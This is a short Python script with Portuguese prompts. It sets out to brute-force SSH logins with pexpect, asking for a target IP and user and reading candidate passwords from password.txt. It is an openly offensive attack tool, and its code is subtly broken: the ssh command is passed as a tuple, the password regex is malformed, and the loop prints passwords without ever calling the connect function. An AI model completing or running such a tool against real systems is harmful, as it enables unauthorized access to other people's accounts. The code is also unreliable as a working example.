#!/usr/bin/python

import pexpect;

def connect(user,host,password,PROMPT):
  ssh_newkey = ('Você deseja continuar conectado?');
  connStr = ('ssh', user, '@', host);
  child = pexpect.spawn(connStr);
  ret = child.expect([pexpect.TIMEOUT, ssh_newkey,'[P||password:]']);
  if (ret == 0):
    print('[-] Error ao Conectar');
    return
  if(ret == 1):
    child.sendline('yes');
    ret = child.expect([pexpect.TIMEOUT, ssh_newkey,'[P||password:]']);
    if (ret == 0):
      print('[- Error ao Conectar]');
      return
  child.sendline(password);
  child.expect(PROMPT);
  return child;
def main():
  host = input('Insira o endereço ip do alvo para o bruteforce:');
  user = input('Conta de usuário para o Bruteforce:');
  arquivo = open("password.txt",'r');
  for password in arquivo.readlines():
    password = password.strip('\n');
    print(password);
main();